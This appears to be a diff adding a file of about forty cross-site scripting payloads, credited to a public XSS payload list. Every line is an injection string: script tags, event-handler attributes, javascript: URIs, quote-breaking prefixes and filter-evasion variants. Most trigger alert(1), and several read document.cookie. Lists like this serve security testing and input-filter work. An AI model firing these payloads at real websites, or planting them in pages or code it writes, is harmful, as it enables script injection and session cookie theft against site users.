@@ -1,0 +1,43 @@
+# Source: https://github.com/payloadbox/xss-payload-list
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert('XSS')</script>
+<ScRiPt>alert(1)</sCrIpT>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
+javascript:alert(1)
+javascript:alert(document.cookie)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit>
+<isindex type=image src=1 onerror=alert(1)>
+<x onclick=alert(1)>click</x>
+'-alert(1)-'
+";alert(1);//
+</script><script>alert(1)</script>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<svg><script>alert(1)</script></svg>
+<math><mtext><script>alert(1)</script></mtext></math>
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<base href="javascript:alert(1)//">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<img """><script>alert(1)</script>
+<svg onload=alert(String.fromCharCode(88,83,83))>
+<<script>alert(1);//<</script>
+<img src=x:alert(1) onerror=eval(src)>
